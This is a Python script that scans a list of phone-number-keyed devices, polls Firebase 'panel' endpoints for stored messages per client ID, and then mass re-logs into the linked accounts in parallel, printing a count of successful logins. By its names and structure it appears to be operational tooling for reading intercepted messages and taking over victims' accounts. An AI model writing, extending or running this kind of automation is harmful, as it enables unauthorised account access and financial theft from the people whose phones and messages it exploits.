"""
relogin_live_nodes.py — Log in fresh accounts using confirmed active Firebase nodes
"""
import json, os, random, requests, sys, time
from concurrent.futures import ThreadPoolExecutor, as_completed

DEV_INDEX = r"C:\Users\Himanshu Kumar\OneDrive\Desktop\stocks\device_index.json"
HERE = r"C:\Users\Himanshu Kumar\OneDrive\Desktop\New folder (2)"

sys.path.append(HERE)
from manage_sessions import ActiveSessionManager

devices = json.load(open(DEV_INDEX))
keys = list(devices.keys())

print(f"Scanning {len(keys)} devices for active Firebase node endpoints...", flush=True)

active_devices = {}
for phone in keys[:250]:
    info = devices[phone]
    purl = info.get("panel_url", "").rstrip("/")
    cid = info.get("client_id", "")
    if not purl or not cid: continue

    url = f"{purl}/messages/{cid}.json"
    try:
        r = requests.get(url, timeout=3)
        if r.status_code == 200 and r.json():
            data = r.json()
            if isinstance(data, dict) and len(data) > 0:
                active_devices[phone] = info
                print(f"🔥 Active Panel: Mobile={phone} | ClientID={cid} | Msgs={len(data)}", flush=True)
    except Exception:
        pass

print(f"\nFound {len(active_devices)} confirmed active Firebase devices. Starting re-login process...\n", flush=True)

def process_single(phone, info):
    mgr = ActiveSessionManager(phone, info)
    ok, msg = mgr.ensure_active_session()
    if ok:
        print(f"✅ SUCCESS LOGIN: {phone} -> {msg}")
        return phone, True, msg
    else:
        print(f"❌ FAIL LOGIN: {phone} -> {msg}")
        return phone, False, msg

results = []
with ThreadPoolExecutor(max_workers=10) as ex:
    futures = {ex.submit(process_single, p, info): p for p, info in active_devices.items()}
    for f in as_completed(futures):
        try:
            results.append(f.result())
        except Exception as e:
            p = futures[f]
            print(f"[{p}] Exception: {e}")

successes = [p for p, ok, m in results if ok]
print(f"\n==========================================================")
print(f"  TOTAL RE-LOGGED FRESH ACTIVE ACCOUNTS: {len(successes)}")
print(f"==========================================================")
